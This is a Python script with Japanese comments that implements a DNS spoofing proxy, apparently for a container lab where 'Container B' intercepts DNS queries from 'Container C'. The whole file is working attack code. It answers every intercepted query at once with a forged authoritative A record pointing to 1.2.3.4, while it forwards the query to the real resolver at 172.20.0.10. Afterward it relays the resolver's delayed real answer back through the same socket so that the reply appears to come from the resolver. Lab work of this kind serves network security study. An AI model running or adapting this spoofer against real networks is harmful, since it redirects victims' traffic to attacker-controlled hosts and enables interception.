import socket
import threading
from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE

def handle_client(data, addr, sock_bc):
    try:
        request = DNSRecord.parse(data)
        qname = str(request.q.qname)
        print(f"[Container B] Intercepted DNS query for '{qname}' from Container C ({addr})", flush=True)

        # バックグラウンドでA(172.20.0.10)へ転送してAを5秒遅延処理に入らせる
        def forward_to_a():
            sock_a = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # 5秒後に帰ってくるAからのパケットを受け止めてCに渡すため5秒プラスアルファ待っている。
            sock_a.settimeout(7)
            try:
                # iptablesのループを避けるため、直接172.20.0.10:53へ送信
                sock_a.sendto(data, ('172.20.0.10', 53))

                # 遅延した本物のレスポンスを受信
                a_data, a_addr = sock_a.recvfrom(1024)
                a_response = DNSRecord.parse(a_data)
                a_answers = [f"{rr.rname} -> {rr.rdata}" for rr in a_response.rr]
                print(f"[Container B] Received delayed response from A ({a_addr[0]}:{a_addr[1]}) | Content: [{', '.join(a_answers)}]", flush=True)

                # ------------------- 追加箇所 -------------------
                # 遅延レスポンスを、本来の宛先である C (172.21.0.30) へ送信する
                # (注意: Cの元々のクライアントポート宛て、またはCのDNSサーバーポート宛て)
                # 送信元が A(172.20.0.10:53) に見えるように sock_bc 経由で返送します
                sock_bc.sendto(a_data, addr)
                print(f"[Container B] Sent delayed response from A back to Container C ({addr})", flush=True)
                # ------------------------------------------------
            except Exception as e:
                print(f"[Container B] Forward to A notice: {e}", flush=True)

        threading.Thread(target=forward_to_a, daemon=True).start()

        # Aが5秒待っている間に、偽装応答 (1.2.3.4) をCへ即座に返却
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A("1.2.3.4"), ttl=60))
        
        # Cへ返答
        sock_bc.sendto(reply.pack(), addr)
        print(f"[Container B] Spoofed response (1.2.3.4) sent to Container C ({addr}) instantly!", flush=True)
    except Exception as e:
        print(f"[Container B] Error: {e}", flush=True)

def main():
    # iptablesからの転送を受けるため 5353 ポートで待受
    sock_bc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock_bc.bind(('0.0.0.0', 5353))
    print("[Container B] Proxy/Spoofer listening on port 5353...", flush=True)

    while True:
        data, addr = sock_bc.recvfrom(1024)
        threading.Thread(target=handle_client, args=(data, addr, sock_bc)).start()

if __name__ == '__main__':
    main()